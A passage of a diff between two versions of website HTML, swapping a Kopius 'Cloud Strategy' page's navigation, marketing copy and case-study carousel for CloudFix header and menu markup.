24.74s24.74-11.11 24.74-24.74c0-4.04.5-8.58.5-13.63s0-9.59-.5-13.63m-70.69-1.01a64.88 64.88 0 0 1 3.54-16.66c2.02-5.05 4.54-9.6 8.58-13.63a37.83 37.83 0 0 1 14.14-9.09 60.12 60.12 0 0 1 39.89 0 37.91 37.91 0 0 1 14.14 9.09 47.73 47.73 0 0 1 8.58 13.63 65.73 65.73 0 0 1 3.54 16.66v28.27a64.88 64.88 0 0 1-3.54 16.66c-2.02 5.05-4.54 9.59-8.58 13.63a42.36 42.36 0 0 1-14.14 9.09c-13.13 4.54-27.26 4.54-39.89 0a42.36 42.36 0 0 1-14.14-9.09 47.73 47.73 0 0 1-8.58-13.63 65.73 65.73 0 0 1-3.54-16.66v-21.71c-.5-2.02 0-4.55 0-6.56m-13.62 49.98c1.01 0 2.02.5 3.03 1.51 1.01 1.01 1.51 2.02 1.01 3.03v11.11c0 1.01-.5 2.02-1.01 3.03-1.01 1.01-2.02 1.51-3.03 1.01h-68.67c-1.01 0-2.02-.5-3.03-1.01-1.01-1.01-1.51-2.02-1.01-3.03V64.7c0-1.01.5-2.02 1.01-3.03 1.01-1.01 2.02-1.51 3.03-1.01h12.62c1.01 0 2.02.5 3.03 1.51 1.01 1.01 1.51 2.02 1.01 3.03v86.84h52v-.5Zm-112.59-15.65c0-1.01.5-2.52 1.51-3.03 1.01-.5 2.02-1.01 3.03-1.01h12.62c1.01 0 2.02.5 3.03 1.01 1.01 1.01 1.51 2.02 1.01 3.03a54.8 54.8 0 0 1-3.03 13.13c-2.02 4.54-4.55 8.58-8.59 11.61a50.58 50.58 0 0 1-14.14 8.58c-6.56 2.52-13.63 3.53-20.7 3.53a61 61 0 0 1-19.18-3.03c-10.6-4.04-19.19-12.12-23.23-22.72a69.36 69.36 0 0 1-4.04-17.67c0-4.04-.5-8.58-.5-13.13 0-5.05 0-9.09.5-13.13.5-6.06 1.51-12.12 4.04-17.67 4.04-10.6 12.62-19.19 23.23-22.72a41.37 41.37 0 0 1 19.18-3.03c7.07 0 14.14 1.01 20.7 3.54a50.58 50.58 0 0 1 14.14 8.58c3.54 3.53 6.56 7.07 8.59 11.61 1.51 4.04 3.03 8.59 3.03 13.13 0 1.01-.5 2.53-1.01 3.03-1.01 1.01-2.02 1.01-3.03 1.01h-12.62c-1.01 0-2.02-.5-3.03-1.01-1.01-.5-1.51-2.02-1.51-3.03a28.2 28.2 0 0 0-2.02-6.06c-1.01-2.02-3.03-4.04-4.55-5.55a35.93 35.93 0 0 0-7.57-4.04c-3.53-1.01-7.07-1.51-10.6-1.51s-7.07.5-10.6 2.02c-3.03 1.01-5.55 3.03-7.57 5.05a19 19 0 0 0-4.55 7.57c-1.01 3.03-2.02 6.06-2.02 9.09 0 4.04-.5 8.58-.5 13.13s0 9.09.5 13.13c0 3.03 1.01 6.56 2.02 9.6a18.9 18.9 0 0 0 4.55 7.57c2.02 2.02 4.55 4.04 7.57 5.05 3.53 1.51 7.07 2.02 10.6 2.02s7.07-.5 10.6-1.51c2.52-1.01 5.05-2.02 7.57-4.04a16.03 16.03 0 0 0 4.55-5.55c.5-2.02 1.51-4.55 2.02-6.56M295.13 29.54h-14.46l-1.77 5.27h-9.76L282.24 0h11.27l13.15 34.81h-9.76l-1.77-5.27Zm-12.11-7.57h9.76l-4.91-14.14-4.85 14.14ZM395.98 0h25.52v7.57h-16.54v5.79h16.18v7.62h-16.18v6.26h16.54v7.57h-25.52V0Zm-26.14 23.01h-4.59V34.8h-8.98V0h17.43c7.72 0 12.11 5.11 12.11 11.58 0 6.05-3.71 9.29-6.94 10.44l7.1 12.79h-10.28l-5.84-11.79Zm2.5-15.45h-7.1v7.83h7.1c2.35 0 4.33-1.51 4.33-3.91s-1.98-3.91-4.33-3.91ZM312.5 0h9.13v20.4c0 4.12 2.19 7.1 7.04 7.1s6.99-2.97 6.99-7.1V0h9.13v20.67c0 8.66-4.96 14.77-16.12 14.77s-16.18-6.16-16.18-14.72V0Zm141.72 29.54h-14.46l-1.77 5.27h-9.76L441.33 0h11.27l13.15 34.81h-9.76l-1.77-5.27Zm-12.11-7.57h9.76l-4.91-14.14-4.85 14.14Z" />
+						</symbol>
+						<symbol id="twitter-logo" viewBox="0 0 24 24">
+							<path fill="currentColor" d="M24 4.6c-.9.3-1.8.6-2.8.7a5 5 0 0 0 2.1-2.7c-1 .6-2 1-3 1.2a5 5 0 0 0-8.5 4.5A14 14 0 0 1 1.7 3a5 5 0 0 0 1.5 6.6c-.8 0-1.6-.2-2.2-.6A5 5 0 0 0 5 14a5 5 0 0 1-2.3 0 5 5 0 0 0 4.6 3.5 9.9 9.9 0 0 1-7.3 2A14 14 0 0 0 21.5 7.1 10 10 0 0 0 24 4.6z" />
+						</symbol>
+						<symbol id="linkedin-logo" viewBox="0 0 24 24">
+							<path fill="currentColor" d="M5 3.5C5 4.9 3.9 6 2.5 6S0 4.9 0 3.5 1.1 1 2.5 1 5 2.1 5 3.5zM5 8H0v16h5V8zm8 0H8v16h5v-8.4c0-4.7 6-5 6 0V24h5V13.9c0-8-9-7.6-11-3.7V8z" />
+						</symbol>
+						<symbol id="youtube-logo" viewBox="0 0 24 24">
+							<path fill="currentColor" d="M22.6 6.7c-.2-.9-1-1.7-1.9-1.9-1.8-.5-8.7-.5-8.7-.5s-6.9 0-8.6.4c-.9.3-1.7 1-1.9 2C1 8.4 1 12 1 12s0 3.6.4 5.3c.3.9 1 1.7 1.9 1.9 1.7.5 8.6.5 8.6.5s6.9 0 8.6-.4c.9-.3 1.7-1 1.9-1.9.6-1.8.6-5.4.6-5.4s0-3.6-.4-5.3zM9.8 15.3V8.7l5.7 3.3-5.7 3.3z" />
+						</symbol>
+						<use xlink:href="#aurea-cloudfix-logo"></use>
+					</svg></a></div>
+					<input class="menu-btn" type="checkbox" id="menu-btn" style="display:none" />
+		<div class="menu-container">
+			<ul id="menu-header-menu" class="menu"><li id="menu-item-10786" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10786"><a href="https://cloudfix.aurea.com/why-cloudfix/">Why CloudFix</a></li>
+<li id="menu-item-10785" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10785"><a href="https://cloudfix.aurea.com/product/">Product</a></li>
+<li id="menu-item-11090" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-11090"><a href="https://cloudfix.aurea.com/pricing/">Pricing</a></li>
+<li id="menu-item-10831" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10831"><a href="https://cloudfix.aurea.com/aws/">AWS Partnership</a></li>
+<li id="menu-item-10495" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-10495"><a href="#">Company</a>
+<ul class="sub-menu">
+	<li id="menu-item-10830" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10830"><a href="https://cloudfix.aurea.com/leadership/">Leadership</a></li>
+	<li id="menu-item-10503" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10503"><a href="https://cloudfix.aurea.com/about-us/">About Us</a></li>
+	<li id="menu-item-10866" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10866"><a href="https://cloudfix.aurea.com/news-events/">News &#038; Events</a></li>
 </ul>
 </li>
-<li id="wp-megamenu-item-2680" class="menu-item menu-item-type-post_type menu-item-object-page current-page-ancestor wp-megamenu-item-2680  wpmm_mega_menu  wpmm-none wpmm-item-fixed-width wpmm-strees-default wpmm-hide-mobile wpmm-submenu-right"><a href="https://kopiustech.com/capabilities/">Capabilities <b class="fa fa-angle-down"></b> </a>
-<ul class="wp-megamenu-sub-menu" >
-	<li id="wp-megamenu-item-4341728754778040147" class="wpmm-row wp-megamenu-item-4341728754778040147 wpmm-submenu-right">
-	<ul class="wp-megamenu-sub-menu" >
-		<li id="wp-megamenu-item-1.24869995022E+19" class="wpmm-col wpmm-col-12 wp-megamenu-item-1.24869995022E+19 wpmm-submenu-right">
-		<ul class="wp-megamenu-sub-menu" >
-			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2680 wpmm-hide-mobile wpmm-submenu-right"><div class="menu-overview-what-we-do-container"><ul id="menu-overview-what-we-do-1" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page current-page-ancestor menu-item-2514"><a href="https://kopiustech.com/capabilities/" data-ps2id-api="true">Capabilities Overview</a></li>
-</ul></div></li>
-		</ul>
-</li>
-	</ul>
-</li>
-	<li id="wp-megamenu-item-3337531221288372493" class="wpmm-row wp-megamenu-item-3337531221288372493 wpmm-submenu-right">
-	<ul class="wp-megamenu-sub-menu" >
-		<li id="wp-megamenu-item-3498102419177209205" class="wpmm-col wpmm-col-4 wp-megamenu-item-3498102419177209205 wpmm-submenu-right">
-		<ul class="wp-megamenu-sub-menu" >
-			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2680 wpmm-hide-mobile wpmm-submenu-right"><h4 class="wpmm-item-title">Digital Experiences + Strategy</h4><div class="menu-strategy-dd-container"><ul id="menu-strategy-dd-1" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2676"><a href="https://kopiustech.com/capabilities/lean-transformation-roadmaps/" data-ps2id-api="true">Lean Transformation Roadmaps </a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2677"><a href="https://kopiustech.com/capabilities/digital-product-planning/" data-ps2id-api="true">Digital Product Planning</a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-879"><a href="https://kopiustech.com/capabilities/customer-experience/" data-ps2id-api="true">Customer Experience</a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2920"><a href="https://kopiustech.com/capabilities/value-definition/" data-ps2id-api="true">Value Definition</a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-843 current_page_item menu-item-881"><a href="https://kopiustech.com/capabilities/cloud-strategy/" aria-current="page" data-ps2id-api="true">Cloud Strategy</a></li>
-</ul></div></li>
-		</ul>
-</li>
-		<li id="wp-megamenu-item-1.20457131269E+19" class="wpmm-col wpmm-col-4 wp-megamenu-item-1.20457131269E+19 wpmm-submenu-right">
-		<ul class="wp-megamenu-sub-menu" >
-			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2680 wpmm-hide-mobile wpmm-submenu-right"><h4 class="wpmm-item-title">Labs + Technology</h4><div class="menu-technology-dd-container"><ul id="menu-technology-dd-1" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2688"><a href="https://kopiustech.com/capabilities/data-and-analytics/" data-ps2id-api="true">Data + Analytics</a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2686"><a href="https://kopiustech.com/capabilities/artificial-intelligence-machine-learning/" data-ps2id-api="true">AI/ML</a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2690"><a href="https://kopiustech.com/capabilities/cloud-application-development/" data-ps2id-api="true">Cloud Application Development</a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2940"><a href="https://kopiustech.com/capabilities/dxp-architecture-solution-development/" data-ps2id-api="true">DXP Architecture + Solution Development </a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2950"><a href="https://kopiustech.com/capabilities/cloud-engineering/" data-ps2id-api="true">Cloud Engineering</a></li>
-</ul></div></li>
-		</ul>
-</li>
-		<li id="wp-megamenu-item-8222468906024073272" class="wpmm-col wpmm-col-4 wp-megamenu-item-8222468906024073272 wpmm-submenu-right">
-		<ul class="wp-megamenu-sub-menu" >
-			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2680 wpmm-hide-mobile wpmm-submenu-right"><h4 class="wpmm-item-title">Operational Services</h4><div class="menu-services-dd-container"><ul id="menu-services-dd-1" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2699"><a href="https://kopiustech.com/capabilities/strategic-technical-capacity/" data-ps2id-api="true">Strategic Technical Capacity</a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2921"><a href="https://kopiustech.com/capabilities/devops/" data-ps2id-api="true">DevOps</a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2697"><a href="https://kopiustech.com/capabilities/project-leadership/" data-ps2id-api="true">Project Leadership</a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2696"><a href="https://kopiustech.com/capabilities/managed-services/" data-ps2id-api="true">Managed Services  </a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2698"><a href="https://kopiustech.com/capabilities/quality-assurance-and-testing/" data-ps2id-api="true">Quality Assurance + Testing</a></li>
-</ul></div></li>
-		</ul>
-</li>
-	</ul>
-</li>
+<li id="menu-item-10498" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-10498"><a href="#">Resources</a>
+<ul class="sub-menu">
+	<li id="menu-item-10783" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10783"><a href="https://cloudfix.aurea.com/resources/">All Resources</a></li>
+	<li id="menu-item-10596" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10596"><a href="https://cloudfix.aurea.com/blog/">Blog</a></li>
+	<li id="menu-item-10939" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10939"><a href="https://cloudfix.aurea.com/success-stories/">Success Stories</a></li>
+	<li id="menu-item-10827" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10827"><a href="https://cloudfix.aurea.com/podcast/">Podcast</a></li>
+	<li id="menu-item-12477" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-12477"><a href="https://cloudfix.aurea.com/livestream/">Livestream</a></li>
+	<li id="menu-item-11006" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-11006"><a href="https://cloudfix.aurea.com/videos/">Videos</a></li>
 </ul>
 </li>
-<li id="wp-megamenu-item-441" class="menu-item menu-item-type-post_type menu-item-object-page wp-megamenu-item-441  wpmm_dropdown_menu  wpmm-none wpmm-item-fixed-width wpmm-strees-default wpmm-submenu-right"><a href="https://kopiustech.com/our-work/">Case Studies</a></li>
-<li id="wp-megamenu-item-2678" class="menu-item menu-item-type-post_type menu-item-object-page wp-megamenu-item-2678  wpmm_mega_menu  wpmm-none wpmm-item-fixed-width wpmm-strees-default wpmm-submenu-right"><a href="https://kopiustech.com/about-us/">About Us <b class="fa fa-angle-down"></b> </a>
-<ul class="wp-megamenu-sub-menu" >
-	<li id="wp-megamenu-item-5917381879845029752" class="wpmm-row wp-megamenu-item-5917381879845029752 wpmm-submenu-right">
-	<ul class="wp-megamenu-sub-menu" >
-		<li id="wp-megamenu-item-7413910049027223042" class="wpmm-col wpmm-col-12 wp-megamenu-item-7413910049027223042 wpmm-submenu-right">
-		<ul class="wp-megamenu-sub-menu" >
-			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2678 wpmm-submenu-right"><div class="menu-about-container"><ul id="menu-about" class="menu"><li id="menu-item-2521" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2521"><a href="https://kopiustech.com/about-us/" data-ps2id-api="true">Company</a></li>
-<li id="menu-item-562" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-562"><a href="https://kopiustech.com/about-us/our-team/" data-ps2id-api="true">Team</a></li>
-<li id="menu-item-3187" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3187"><a href="https://kopiustech.com/about-us/our-partners/" data-ps2id-api="true">Platforms + Partners</a></li>
-<li id="menu-item-2542" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2542"><a href="https://kopiustech.com/contact-us/" data-ps2id-api="true">Contact</a></li>
-</ul></div></li>
-		</ul>
-</li>
-	</ul>
-</li>
-</ul>
-</li>
-<li id="wp-megamenu-item-477" class="menu-item menu-item-type-post_type menu-item-object-page wp-megamenu-item-477  wpmm_dropdown_menu  wpmm-none wpmm-submenu-right"><a href="https://kopiustech.com/insights-innovation/">Insights</a></li>
-<li id="wp-megamenu-item-2567" class="menu-item menu-item-type-post_type menu-item-object-page wp-megamenu-item-2567  wpmm_dropdown_menu  wpmm-none wpmm-submenu-right"><a href="https://kopiustech.com/careers/">Careers</a></li>
-<li id="wp-megamenu-item-3640" class="menu-item menu-item-type-post_type menu-item-object-page wp-megamenu-item-3640  wpmm_dropdown_menu  wpmm-none wpmm-submenu-right"><a href="https://kopiustech.com/contact-us/">Contact Us</a></li>
-<li id="wp-megamenu-item-3642" class="weglot-parent-menu-item weglot-lang menu-item-weglot weglot-language en menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children wp-megamenu-item-3642  wpmm_dropdown_menu  wpmm-none wpmm-submenu-right"><a title="English" href="#weglot_switcher">EN <b class="fa fa-angle-down"></b> </a>
-<ul class="wp-megamenu-sub-menu" >
-	<li id="wp-megamenu-item-weglot-3642-es" class="weglot-lang menu-item-weglot weglot-language weglot-es menu-item menu-item-type-custom menu-item-object-custom wp-megamenu-item-weglot-3642-es wpmm-submenu-right"><a title="Español" href="https://kopiustech.com/es/capabilities/cloud-strategy/">ES</a></li>
-</ul>
-</li>
-</ul>
-			</div>
-
-
-			
-		    
-		</nav>			<section class="search-container">
-				<div id="header-search">
-					<div class="search-form">
-  <input type="checkbox" id="checkTab" name="checkTab"> 
-  <label class="search-icon" for="checkTab">
-    <span class="icon"></span>
-  </label>
-  <div class="tabs">
-    <div class="nav-box">
-      <form role="search"  method="get" action="https://kopiustech.com/">
-
-        <span class="sr-only">Search for:</span>
-        <span class="icon"></span>
-        <input type="search" class="search-field" placeholder="Search&hellip;" value="" name="s">
-        <button type="submit" class="search-submit">Search</button>
-      </form>
-    </div>
-  </div>
-</div>
-				</div>
-			</section>
-		</nav><!-- #site-navigation -->
-	</header><!-- #masthead -->
-
-	<main id="primary" class="site-main">
-
-		
-<article id="post-843" class="post-843 page type-page status-publish hentry">
-	<header class="entry-header">
-		<h1 class="entry-title">Cloud Strategy</h1>	</header><!-- .entry-header -->
-
-	
-	<div class="entry-content">
-		
-<div><div class="crown-header center" style="background-image:url(https://kopiustech.com/wp-content/uploads/2023/03/iStock-1319893380-magentifyHDx-scaled.jpg);background-size:cover;background-position:center;background:bgColor"><div class="title"><h6 class="subtitle" style="color:#ffffff"><strong>Digital Experiences + Strategy</strong></h6><h2 class="collapsible" style="color:#ffffff">Cloud Strategy</h2></div><div class="divider"></div><div class="content"></div></div></div>
-
-
-
-<div class="wp-block-getwid-section getwid-section-content-custom-width"><div class="wp-block-getwid-section__wrapper getwid-padding-left-normal getwid-padding-right-normal" style="padding-top:120px;padding-bottom:120px"><div class="wp-block-getwid-section__inner-wrapper" style="max-width:800px"><div class="wp-block-getwid-section__background-holder"><div class="wp-block-getwid-section__background"></div><div class="wp-block-getwid-section__foreground"></div></div><div class="wp-block-getwid-section__content"><div class="wp-block-getwid-section__inner-content">
-<h2 class="has-text-align-center">To the Cloud and Beyond</h2>
-
-
-
-<p class="has-text-align-center has-medium-font-size">Understand your current ecosystem and use our cloud expertise to define how to move your business from yesterday’s to tomorrow’s cloud-forward world. Step into the future equipped with the full power of the cloud.</p>
-</div></div></div></div></div>
-
-
-
-<div class="wp-block-getwid-section getwid-section-content-custom-width"><div class="wp-block-getwid-section__wrapper getwid-padding-left-normal getwid-padding-right-normal getwid-padding-tablet-top-none getwid-padding-tablet-bottom-none getwid-padding-tablet-left-normal getwid-padding-tablet-right-normal getwid-padding-mobile-top-large getwid-padding-mobile-bottom-large getwid-padding-mobile-left-normal getwid-padding-mobile-right-normal" style="padding-top:120px;padding-bottom:120px"><div class="wp-block-getwid-section__inner-wrapper" style="max-width:1440px"><div class="wp-block-getwid-section__background-holder"><div class="wp-block-getwid-section__background has-background" style="background-color:#f9f9f9"></div><div class="wp-block-getwid-section__foreground"></div></div><div class="wp-block-getwid-section__content"><div class="wp-block-getwid-section__inner-content">
-<div class="is-layout-flex wp-container-4 wp-block-columns services">
-<div class="is-layout-flow wp-block-column" style="flex-basis:50%">
-<figure class="wp-block-image size-large"><img decoding="async" width="1667" height="1667"  alt=""  data-srcset="https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg 1667w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-300x300.jpg 300w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-1024x1024.jpg 1024w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-150x150.jpg 150w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-768x768.jpg 768w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-1536x1536.jpg 1536w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-600x600.jpg 600w"  data-src="https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg" data-sizes="(max-width: 1667px) 100vw, 1667px" class="wp-image-3274 lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img decoding="async" width="1667" height="1667" src="https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg" alt="" class="wp-image-3274" srcset="https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg 1667w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-300x300.jpg 300w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-1024x1024.jpg 1024w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-150x150.jpg 150w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-768x768.jpg 768w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-1536x1536.jpg 1536w, https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited-600x600.jpg 600w" sizes="(max-width: 1667px) 100vw, 1667px" /></noscript></figure>
-</div>
-
-
-
-<div class="is-layout-flow wp-block-column">
-<h3>What Can This Solution Do For You?</h3>
-
-
-
-<p>Make total use of the cloud and empower your transformation to a future-ready enterprise. The cloud is more than just a data, storage, and computing solution – it’s a transformative engine to drive business. Start with a process that identifies opportunities to address costs, security, accessibility, risk, deployment speed, and efficiency. Take the next step and introduce a new SaaS-based business model so your businesses can capture new revenue sources.</p>
-
-
-
-<div class="is-layout-flex wp-block-buttons">
-<div class="wp-block-button"><a class="wp-block-button__link wp-element-button" href="http://kopius.wpengine.com/contact-us/">Contact Us</a></div>
-</div>
-</div>
-</div>
-</div></div></div></div></div>
-
-
-
-<div style="height:40px" aria-hidden="true" class="wp-block-spacer"></div>
-
-
-
-<div class="wp-block-getwid-section getwid-section-content-custom-width" style="margin-top:0px"><div class="wp-block-getwid-section__wrapper getwid-padding-left-normal getwid-padding-right-normal getwid-padding-tablet-top-none getwid-padding-tablet-bottom-none getwid-padding-tablet-left-normal getwid-padding-tablet-right-normal getwid-padding-mobile-top-large getwid-padding-mobile-bottom-large getwid-padding-mobile-left-normal getwid-padding-mobile-right-normal" style="padding-top:120px;padding-bottom:120px"><div class="wp-block-getwid-section__inner-wrapper" style="max-width:1440px"><div class="wp-block-getwid-section__background-holder"><div class="wp-block-getwid-section__background"></div><div class="wp-block-getwid-section__foreground"></div></div><div class="wp-block-getwid-section__content"><div class="wp-block-getwid-section__inner-content">
-<h3>Case Studies</h3>
-
-
-
-<div style="height:32px" aria-hidden="true" class="wp-block-spacer"></div>
-
-
-
-        <div class="wp-block-getwid-post-carousel custom-post-type-crown_case_studies has-slides-gap-large is-carousel has-arrows-outside has-dots-none">
-            <div data-slider-option="{&quot;sliderSlidesToShowDesktop&quot;:&quot;3&quot;,&quot;getwid_slidesToShowLaptop&quot;:&quot;1&quot;,&quot;getwid_slidesToShowTablet&quot;:&quot;1&quot;,&quot;getwid_slidesToShowMobile&quot;:&quot;1&quot;,&quot;getwid_autoplay_speed&quot;:6000,&quot;getwid_animation_speed&quot;:800,&quot;getwid_slidesToScroll&quot;:&quot;1&quot;,&quot;getwid_autoplay&quot;:false,&quot;getwid_infinite&quot;:true,&quot;getwid_center_mode&quot;:false,&quot;getwid_arrows&quot;:&quot;outside&quot;,&quot;getwid_dots&quot;:&quot;none&quot;}" class="wp-block-getwid-post-carousel__wrapper">
-                							<div class="wp-block-getwid-post-carousel__slide">
-								
-<div class="wp-block-getwid-post-carousel__post">
-            <div class="wp-block-getwid-post-carousel__post-thumbnail">
-            <a href="https://kopiustech.com/case-studies/cloud-enablement-precisionhawk/"><img width="1092" height="613"   alt="" decoding="async" data-srcset="https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk.png 1092w, https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk-300x168.png 300w, https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk-1024x575.png 1024w, https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk-768x431.png 768w"  data-src="https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk.png" data-sizes="(max-width: 1092px) 100vw, 1092px" class="attachment-post-thumbnail size-post-thumbnail wp-post-image lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img width="1092" height="613" src="https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" srcset="https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk.png 1092w, https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk-300x168.png 300w, https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk-1024x575.png 1024w, https://kopiustech.com/wp-content/uploads/2021/06/PrecisionHawk-768x431.png 768w" sizes="(max-width: 1092px) 100vw, 1092px" /></noscript></a>
+<li id="menu-item-10787" class="nav-btn calendly-demo menu-item menu-item-type-custom menu-item-object-custom menu-item-10787"><a href="/demo/">Schedule a Live Demo</a></li>
+</ul>		</div>
+        <div class="hamburger">
+            <label class="menu-icon" for="menu-btn"><span class="navicon"></span></label>
         </div>
-        <div class="wp-block-getwid-post-carousel__post-content-wrapper">
-        <div class="wp-block-getwid-post-carousel__post-header">
-            <h3 class="wp-block-getwid-post-carousel__post-title"><a href="https://kopiustech.com/case-studies/cloud-enablement-precisionhawk/">Cloud Enablement</a></h3>        </div>
-        <div class="wp-block-getwid-post-carousel__post-excerpt"><p>PrecisionHawk</p>
-</div>
-    </div>
-</div>
-
-							</div>
-													<div class="wp-block-getwid-post-carousel__slide">
-								
-<div class="wp-block-getwid-post-carousel__post">
-            <div class="wp-block-getwid-post-carousel__post-thumbnail">
-            <a href="https://kopiustech.com/case-studies/cloud-enablement-machine-learning/"><img width="1096" height="616"   alt="" decoding="async" loading="lazy" data-srcset="https://kopiustech.com/wp-content/uploads/2021/06/Rain.png 1096w, https://kopiustech.com/wp-content/uploads/2021/06/Rain-300x169.png 300w, https://kopiustech.com/wp-content/uploads/2021/06/Rain-1024x576.png 1024w, https://kopiustech.com/wp-content/uploads/2021/06/Rain-768x432.png 768w"  data-src="https://kopiustech.com/wp-content/uploads/2021/06/Rain.png" data-sizes="(max-width: 1096px) 100vw, 1096px" class="attachment-post-thumbnail size-post-thumbnail wp-post-image lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img width="1096" height="616" src="https://kopiustech.com/wp-content/uploads/2021/06/Rain.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://kopiustech.com/wp-content/uploads/2021/06/Rain.png 1096w, https://kopiustech.com/wp-content/uploads/2021/06/Rain-300x169.png 300w, https://kopiustech.com/wp-content/uploads/2021/06/Rain-1024x576.png 1024w, https://kopiustech.com/wp-content/uploads/2021/06/Rain-768x432.png 768w" sizes="(max-width: 1096px) 100vw, 1096px" /></noscript></a>
-        </div>
-        <div class="wp-block-getwid-post-carousel__post-content-wrapper">
-        <div class="wp-block-getwid-post-carousel__post-header">
-            <h3 class="wp-block-getwid-post-carousel__post-title"><a href="https://kopiustech.com/case-studies/cloud-enablement-machine-learning/">Cloud Enablement and Machine Learning</a></h3>        </div>
-        <div class="wp-block-getwid-post-carousel__post-excerpt"><p>Fortune 500 Insurance Company  </p>
-</div>
-    </div>
-</div>
-
-							</div>
-						            </div>
-        </div>
-        </div></div></div></div></div>
-
-
-
-<div class="wp-block-getwid-section full-width-newsletter getwid-section-content-custom-width"><div class="wp-block-getwid-section__wrapper getwid-padding-mobile-top-large getwid-padding-mobile-bottom-large getwid-padding-mobile-left-large getwid-padding-mobile-right-large" style="padding-top:78px;padding-bottom:78px;padding-left:136px;padding-right:136px"><div class="wp-block-getwid-section__inner-wrapper" style="max-width:850px"><div class="wp-block-getwid-section__background-holder"><div class="wp-block-getwid-section__background"></div><div class="wp-block-getwid-section__foreground"></div></div><div class="wp-block-getwid-section__content"><div class="wp-block-getwid-section__inner-content">
-<h6 class="has-text-align-center has-white-color has-text-color">NEWSLETTER</h6>
-
-
-
-<h2 class="has-text-align-center has-white-color has-text-color">Never miss the latest news and insights from Kopius. </h2>
-
-
-
-<div class="is-content-justification-center is-layout-flex wp-container-5 wp-block-buttons">
